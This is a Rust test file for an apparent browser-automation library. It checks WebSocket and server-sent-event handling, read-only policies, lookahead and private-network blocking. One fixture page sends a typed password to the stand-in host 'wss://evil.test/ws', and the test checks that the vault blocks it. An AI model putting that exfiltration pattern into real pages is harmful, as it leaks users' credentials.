//! Realtime connections in pages: WebSocket and EventSource over replayed and live
//! connections, under the policy, the vault and lookahead.

mod common;

use common::*;
use pageon::{
    Action, Budget, Dump, LoadOptions, Policy, Recording, Replay, Sandbox, SandboxOptions, Secret,
    Secrets, Session, Viewport,
};
use pageon_env::{Env, Log, Rt, StreamEvent};

const CHAT: &str = "<title>Chat</title><ul id=log></ul><input aria-label=Message id=m>
<script>
const ws = new WebSocket('wss://chat.test/ws', ['chat']);
ws.binaryType = 'arraybuffer';
const add = t => { const li = document.createElement('li'); li.textContent = t; log.append(li); };
ws.onopen = () => add('open ' + ws.protocol + ' ' + ws.readyState);
ws.onmessage = e => add('got ' + (typeof e.data === 'string' ? e.data : 'bytes ' + e.data.byteLength) + ' from ' + e.origin);
ws.onerror = () => add('error');
ws.onclose = e => add('closed ' + e.code + ' ' + e.wasClean + ' ' + e.reason);
m.addEventListener('keydown', e => { if (e.key === 'Enter') { ws.send(m.value); m.value = ''; } });
</script>";

fn text(t: &str) -> StreamEvent {
    StreamEvent::Text(t.into())
}

fn ev(id: u64, event: StreamEvent) -> Rt {
    Rt::Event { id, at: 0, event }
}

fn sent(id: u64, t: &str) -> Rt {
    Rt::Sent {
        id,
        text: Some(t.into()),
        base64: None,
    }
}

/// The chat page, a greeting and a binary message, and the reply to "hi".
fn chat() -> Log {
    let mut l = site(vec![html("https://chat.test/", CHAT)]);
    l.realtime = vec![
        Rt::Open {
            id: 1,
            url: "wss://chat.test/ws".into(),
            status: 101,
            headers: vec![("sec-websocket-protocol".into(), "chat".into())],
            error: None,
        },
        ev(1, text("hello")),
        ev(1, StreamEvent::Binary(vec![1, 2, 3])),
        sent(1, "hi"),
        ev(1, text("echo: hi")),
    ];
    l
}

fn items<E: Env>(tab: &pageon::Tab<'_, E>) -> String {
    tab.view(Dump::Text, Viewport::default(), Budget::o200k(4000))
}

fn type_and_send<E: Env>(tab: &mut pageon::Tab<'_, E>, text: &str) -> pageon::Outcome {
    let obs = tab.observe_full();
    let field = find(&obs, "textbox", "Message");
    tab.act(Action::Type(field, text.into()))
        .unwrap_or_else(|e| panic!("{e}"));
    tab.act(Action::Press("Enter".into()))
        .unwrap_or_else(|e| panic!("{e}"))
}

#[test]
fn a_chat_over_websocket() {
    let session = Session::new(Replay::new(chat()));
    let mut tab = session
        .open("https://chat.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    let t = items(&tab);
    assert!(t.contains("open chat 1"), "{t}");
    assert!(t.contains("got hello from wss://chat.test"), "{t}");
    assert!(t.contains("got bytes 3 from wss://chat.test"), "{t}");
    // The reply is not there before the question.
    assert!(!t.contains("echo"), "{t}");
    let out = type_and_send(&mut tab, "hi");
    assert!(out.to_string().contains("1 frame(s) sent"), "{out}");
    let t = items(&tab);
    assert!(t.contains("got echo: hi"), "{t}");
    let requests = tab.view(Dump::Requests, Viewport::default(), Budget::o200k(4000));
    assert!(
        requests.contains("GET 101 websocket wss://chat.test/ws"),
        "{requests}"
    );
    let frames: Vec<String> = out.requests.iter().map(ToString::to_string).collect();
    assert_eq!(frames, ["SEND sent websocket wss://chat.test/ws"]);
}

#[test]
fn the_api_validates_like_browsers() {
    let page = "<p id=out></p><script>
      const r = [];
      try { new WebSocket('ftp://x.test/'); } catch (e) { r.push(e.name); }
      try { new WebSocket('wss://x.test/#a'); } catch (e) { r.push(e.name); }
      try { new WebSocket('wss://x.test/', ['a', 'a']); } catch (e) { r.push(e.name); }
      const w = new WebSocket('/ws');
      r.push(w.url, w.readyState, w.binaryType, w.extensions === '', WebSocket.OPEN);
      try { w.send('x'); } catch (e) { r.push(e.name); }
      try { w.close(1001); } catch (e) { r.push(e.name); }
      w.binaryType = 'nope'; r.push(w.binaryType);
      const c = new CloseEvent('close', {code: 4000, reason: 'r', wasClean: true});
      r.push(c.code, c.reason, c.wasClean);
      out.textContent = r.join(',');
    </script>";
    let l = site(vec![html("https://x.test/", page)]);
    let session = Session::new(Replay::new(l));
    let tab = session
        .open("https://x.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    assert!(
        items(&tab).contains(
            "SyntaxError,SyntaxError,SyntaxError,wss://x.test/ws,0,blob,true,1,InvalidStateError,InvalidAccessError,blob,4000,r,true"
        ),
        "{}",
        items(&tab)
    );
}

#[test]
fn server_sent_events_and_reconnection() {
    let page = "<ul id=log></ul><script>
      const add = t => { const li = document.createElement('li'); li.textContent = t; log.append(li); };
      const es = new EventSource('/events');
      es.onopen = () => add('open');
      es.onmessage = e => add('message ' + e.data + ' id ' + e.lastEventId);
      es.addEventListener('price', e => add('price ' + e.data));
      es.onerror = () => add('error ' + es.readyState);
    </script>";
    let mut l = site(vec![html("https://dash.test/", page)]);
    let ok = |id| Rt::Open {
        id,
        url: "https://dash.test/events".into(),
        status: 200,
        headers: vec![("content-type".into(), "text/event-stream".into())],
        error: None,
    };
    let chunk = |id, s: &str| ev(id, StreamEvent::Binary(s.as_bytes().to_vec()));
    l.realtime = vec![
        ok(1),
        chunk(
            1,
            "retry: 500\nid: 7\ndata: one\ndata: two\n\nevent: price\n",
        ),
        chunk(1, "data: 42\n\n: comment\n"),
        ev(
            1,
            StreamEvent::Closed {
                code: 1000,
                reason: String::new(),
                clean: true,
            },
        ),
        ok(2),
        chunk(2, "data: three\r\n\r\n"),
    ];
    let session = Session::new(Replay::new(l));
    let mut tab = session
        .open("https://dash.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    let t = items(&tab);
    assert!(t.contains("open"), "{t}");
    assert!(
        t.contains("message one\ntwo id 7") || t.contains("message one two id 7"),
        "{t}"
    );
    assert!(t.contains("price 42"), "{t}");
    assert!(t.contains("error 0"), "reconnecting: {t}");
    // After `retry` ms it reconnects (with Last-Event-ID) and goes on.
    tab.act(Action::Wait(600)).unwrap_or_else(|e| panic!("{e}"));
    let t = items(&tab);
    assert!(t.contains("message three id 7"), "{t}");
}

#[test]
fn frames_are_writes_under_the_policy() {
    // A read-only origin streams to the page; the page's frame is refused.
    let env = Policy::new(Replay::new(chat())).read_only(["https://chat.test", "wss://chat.test"]);
    let session = Session::new(env);
    let mut tab = session
        .open("https://chat.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    assert!(items(&tab).contains("got hello"), "{}", items(&tab));
    let out = type_and_send(&mut tab, "hi");
    assert!(out.to_string().contains("1 refused"), "{out}");
    let t = items(&tab);
    assert!(
        t.contains("closed 1008 false policy: SEND to read-only wss://chat.test"),
        "{t}"
    );
    assert!(!t.contains("echo"), "{t}");
    let frames: Vec<String> = out.requests.iter().map(ToString::to_string).collect();
    assert!(
        frames[0]
            .starts_with("SEND blocked websocket wss://chat.test/ws (policy: SEND to read-only"),
        "{frames:?}"
    );
    // A guard sees each frame as a write.
    let seen = std::rc::Rc::new(std::cell::RefCell::new(Vec::new()));
    let log = seen.clone();
    let env = Policy::new(Replay::new(chat())).guard(move |e| {
        log.borrow_mut()
            .push(format!("{} {} {:?}", e.method, e.url, e.class));
        pageon::Verdict::Allow
    });
    let session = Session::new(env);
    let mut tab = session
        .open("https://chat.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    type_and_send(&mut tab, "hi");
    assert!(
        seen.borrow()
            .iter()
            .any(|s| s == "SEND wss://chat.test/ws Write"),
        "{:?}",
        seen.borrow()
    );
}

#[test]
fn secrets_do_not_leave_over_sockets() {
    let page = "<input aria-label=Password type=password id=p><button onclick=\"ws.send(p.value)\">Go</button>
      <p id=s></p><script>const ws = new WebSocket('wss://evil.test/ws');
      ws.onclose = e => s.textContent = 'closed ' + e.code + ' ' + e.reason;</script>";
    let mut l = site(vec![html("https://shop.test/", page)]);
    l.realtime = vec![Rt::Open {
        id: 1,
        url: "wss://evil.test/ws".into(),
        status: 101,
        headers: vec![],
        error: None,
    }];
    let env = Secrets::new(Replay::new(l)).with(
        "shop",
        Secret::value("hunter2-x").origins(["https://shop.test"]),
    );
    let session = Session::new(env);
    let mut tab = session
        .open("https://shop.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    let obs = tab.observe_full();
    tab.act(Action::Type(
        find(&obs, "textbox", "Password"),
        "secret://shop".into(),
    ))
    .unwrap_or_else(|e| panic!("{e}"));
    tab.act(Action::Click(find(&obs, "button", "Go")))
        .unwrap_or_else(|e| panic!("{e}"));
    let t = items(&tab);
    assert!(
        t.contains("closed 1008 secret://shop would leave for wss://evil.test"),
        "{t}"
    );
}

fn caged<E: pageon::Env>(env: E) -> Sandbox<E> {
    Sandbox::new(
        env,
        SandboxOptions {
            program: Some(env!("CARGO_BIN_EXE_pageon").into()),
            ..SandboxOptions::default()
        },
    )
    .unwrap_or_else(|e| panic!("{e}"))
}

#[test]
fn caged_chat_and_a_lookahead_that_would_send() {
    let mut sb = caged(Replay::new(chat()));
    let mut tab = sb
        .open("https://chat.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    let obs = tab.observe().unwrap_or_else(|e| panic!("{e}"));
    assert!(obs.contains("got hello"), "{obs}");
    let field = find(&obs, "textbox", "Message");
    // Trying it on a fork: the frame is held, the server gets nothing.
    let la = tab
        .lookahead(vec![
            Action::Type(field.clone(), "hi".into()),
            Action::Press("Enter".into()),
        ])
        .unwrap_or_else(|e| panic!("{e}"));
    let pending = la
        .pending
        .as_ref()
        .map(|p| format!("{} {}", p.method, p.url));
    assert_eq!(pending.as_deref(), Some("SEND wss://chat.test/ws"), "{la}");
    // For real.
    tab.act(Action::Type(field, "hi".into()))
        .unwrap_or_else(|e| panic!("{e}"));
    let out = tab
        .act(Action::Press("Enter".into()))
        .unwrap_or_else(|e| panic!("{e}"));
    assert!(out.to_string().contains("1 frame(s) sent"), "{out}");
    let obs = tab.observe().unwrap_or_else(|e| panic!("{e}"));
    assert!(obs.contains("got echo: hi"), "{obs}");
}

/// Pages from a recording, realtime connections live (a loopback server).
struct Mixed {
    pages: Replay,
    live: pageon::Live,
}

impl Env for Mixed {
    fn fetch(&self, req: &pageon::Request) -> Result<pageon_env::Response, pageon_env::NetError> {
        self.pages.fetch(req)
    }
    fn now_ms(&self) -> Result<u64, pageon_env::NetError> {
        self.pages.now_ms()
    }
    fn random_u64(&self) -> Result<u64, pageon_env::NetError> {
        self.pages.random_u64()
    }
    fn stream(
        &self,
        call: &pageon_env::StreamCall,
    ) -> Result<pageon_env::StreamReply, pageon_env::NetError> {
        self.live.stream(call)
    }
}

#[test]
#[allow(clippy::disallowed_methods)] // a test server in real time
fn live_websocket_recorded_then_replayed_exactly() {
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap_or_else(|e| panic!("{e}"));
    let port = l.local_addr().map(|a| a.port()).unwrap_or_default();
    std::thread::spawn(move || {
        let Ok((s, _)) = l.accept() else { return };
        let Ok(mut ws) = tungstenite::accept(s) else {
            return;
        };
        let _ = ws.send(tungstenite::Message::text("hello"));
        while let Ok(tungstenite::Message::Text(t)) = ws.read() {
            std::thread::sleep(std::time::Duration::from_millis(100));
            let _ = ws.send(tungstenite::Message::text(format!("echo: {t}")));
        }
    });
    let page = CHAT
        .replace("wss://chat.test/ws", &format!("ws://127.0.0.1:{port}/ws"))
        .replace(", ['chat']", "");
    let pages = site(vec![html("http://chat.test/", &page)]);
    let options = LoadOptions {
        allow_private_network: true,
        ..LoadOptions::default()
    };
    let rec = Recording::new(Mixed {
        pages: Replay::new(pages),
        live: pageon::Live::default(),
    });
    let views = {
        let session = Session::new(&rec);
        let mut tab = session
            .open("http://chat.test/", options.clone())
            .unwrap_or_else(|e| panic!("{e}"));
        // The greeting may need real time to arrive.
        tab.act(Action::Wait(2000))
            .unwrap_or_else(|e| panic!("{e}"));
        let first = items(&tab);
        assert!(first.contains("got hello"), "{first}");
        // The reply comes within the action's one-second wait.
        type_and_send(&mut tab, "hi");
        let second = items(&tab);
        assert!(second.contains("got echo: hi"), "{second}");
        (first, second)
    };
    // Offline, the same views.
    let session = Session::new(Replay::new(rec.log()));
    let mut tab = session
        .open("http://chat.test/", options)
        .unwrap_or_else(|e| panic!("{e}"));
    tab.act(Action::Wait(2000))
        .unwrap_or_else(|e| panic!("{e}"));
    assert_eq!(items(&tab), views.0);
    type_and_send(&mut tab, "hi");
    assert_eq!(items(&tab), views.1);
}

#[test]
fn the_private_network_and_navigation_close_connections() {
    // No private network unless allowed: refused before connecting.
    let page = "<p id=s>waiting</p><script>const ws = new WebSocket('ws://127.0.0.1:9/x');
      ws.onclose = e => s.textContent = 'closed ' + e.code;</script>";
    let l = site(vec![html("https://p.test/", page)]);
    let session = Session::new(Replay::new(l));
    let tab = session
        .open("https://p.test/", LoadOptions::default())
        .unwrap_or_else(|e| panic!("{e}"));
    assert!(items(&tab).contains("closed 1006"), "{}", items(&tab));
    let requests = tab.view(Dump::Requests, Viewport::default(), Budget::o200k(4000));
    assert!(requests.contains("private network"), "{requests}");
    // Leaving the page closes its connections (the recording keeps the close).
    let mut l = chat();
    l.exchanges
        .push(html("https://chat.test/next", "<p>next</p>"));
    let rec = Recording::new(Replay::new(l));
    {
        let session = Session::new(&rec);
        let mut tab = session
            .open("https://chat.test/", LoadOptions::default())
            .unwrap_or_else(|e| panic!("{e}"));
        tab.act(Action::Goto("https://chat.test/next".into()))
            .unwrap_or_else(|e| panic!("{e}"));
    }
    let closes: Vec<_> = rec
        .log()
        .realtime
        .iter()
        .filter(|e| matches!(e, Rt::Close { code: 1001, .. }))
        .cloned()
        .collect();
    assert_eq!(closes.len(), 1, "{:?}", rec.log().realtime);
}
